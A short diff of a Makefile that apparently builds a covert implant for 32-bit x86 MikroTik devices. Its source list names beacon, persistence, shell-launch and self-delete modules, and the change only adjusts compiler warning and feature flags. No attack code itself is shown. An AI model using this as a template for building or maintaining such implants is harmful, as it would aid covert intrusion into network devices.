@@ -35,10 +35,11 @@ SERVER_SRCS = beacon.c persistence.c launchshell.c \
 	client_session.c threads.c self_delete.c $(POLARSSL)/crypto.c $(LIBPOLARSSL) \
 	get_data.c process_list.c netstat_an.c netstat_rn.c ifconfig.c compression.c $(LIBBZIP2)
 
-#OBJECTS = $(SRCS:%.c=%.o)
-CFLAGS += -L$(UCLIBC_LIBS) -Os -W -Wall -D_X86 -m32 -lpthread -lutil
-CFLAGS += $(INCLUDES) -D_IPCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF -DLINUX -DUCLIBC
+CFLAGS = -Wall -Wextra -ansi -std=gnu99
+CFLAGS += -L$(UCLIBC_LIBS) -Os -D_X86 -m32 -lpthread -lutil
+CFLAGS += $(INCLUDES) -D_IPCONFIG -D_NETSTAT_AN -D_NETSTAT_RN -D_PS_EF -DLINUX -DUCLIBC -D_GNU_SOURCE
 CFLAGS += -DMIKROTIK -D__BYTE_ORDER=LITTLE_ENDIAN -D_X86
+
 DBGFLAGS += -DDEBUG -D_DEBUG -g
 
 #STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note
